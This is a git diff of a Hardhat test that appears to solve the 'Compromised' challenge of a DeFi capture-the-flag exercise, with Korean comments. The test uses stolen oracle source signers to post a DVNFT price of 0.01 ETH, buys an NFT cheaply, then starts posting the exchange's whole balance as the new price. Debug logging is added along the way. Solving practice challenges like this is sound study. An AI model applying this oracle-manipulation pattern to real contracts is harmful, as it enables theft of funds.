@@ -32,22 +32,25 @@ describe('Compromised challenge', function () {
                 await ethers.provider.getBalance(sources[i])
             ).to.equal(ethers.utils.parseEther('2'));
         }
-
         // Attacker starts with 0.1 ETH in balance
-        await ethers.provider.send("hardhat_setBalance", [
-            attacker.address,
-            "0x1bc16d674ec80000", // 0.1 ETH
-        ]);
-        expect(
-            await ethers.provider.getBalance(attacker.address)
-        ).to.equal(ethers.utils.parseEther('2'));
         // await ethers.provider.send("hardhat_setBalance", [
         //     attacker.address,
-        //     "0x16345785d8a0000", // 0.1 ETH
+        //     //(ethers.utils.parseEther('0.2')).toHexString(), // 0.2 ETH
+        //     // "0x02c68af0bb140000",
+        //     "0x2c68af0bb140000",
         // ]);
         // expect(
         //     await ethers.provider.getBalance(attacker.address)
-        // ).to.equal(ethers.utils.parseEther('0.1'));
+        // ).to.equal(ethers.utils.parseEther('0.2'));
+
+
+        await ethers.provider.send("hardhat_setBalance", [
+            attacker.address,
+            "0x16345785d8a0000", // 0.1 ETH
+        ]);
+        expect(
+            await ethers.provider.getBalance(attacker.address)
+        ).to.equal(ethers.utils.parseEther('0.1'));
 
         // Deploy the oracle and setup the trusted sources with initial prices
         this.oracle = await TrustfulOracleFactory.attach(
@@ -88,15 +91,18 @@ describe('Compromised challenge', function () {
         // console.log(await ethers.provider.getBalance(source1.address))
         // console.log(await ethers.provider.getBalance(source2.address))
         // 3. 생성된 signer로 postPrice() 수행 -> 가격은 attacker가 보유한 0.1 ETH로
-        let tx = await this.oracle.connect(source1).postPrice("DVNFT", ethers.utils.parseEther('0.1'));
+        let tx = await this.oracle.connect(source1).postPrice("DVNFT", ethers.utils.parseEther('0.01'));
         await tx.wait();
-        tx = await this.oracle.connect(source2).postPrice("DVNFT", ethers.utils.parseEther('0.1'));
+        tx = await this.oracle.connect(source2).postPrice("DVNFT", ethers.utils.parseEther('0.01'));
         await tx.wait();
 
+        console.log('>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>')
         // // 4. buyOne 수행 -> attacker가 NFT를 0.1 ETH에 구매
-        tx = await this.exchange.connect(attacker).buyOne({ value: ethers.utils.parseEther('0.1') });
-        await tx.wait();
-
+        tx = await this.exchange.connect(attacker).buyOne({ value: ethers.utils.parseEther('0.01') });
+        let receipt = await tx.wait();
+        console.log(tx)
+        console.log(receipt)
+        console.log('XXXXXX')
         // // 5. 생성된 signer로 postPrice() 수행 -> 가격은 EXCHANGE_INITIAL_ETH_BALANCE에 해당하는 9990 ETH로
         let totalBalance = await ethers.provider.getBalance(this.exchange.address);
         tx = await this.oracle.connect(source1).postPrice("DVNFT", totalBalance);
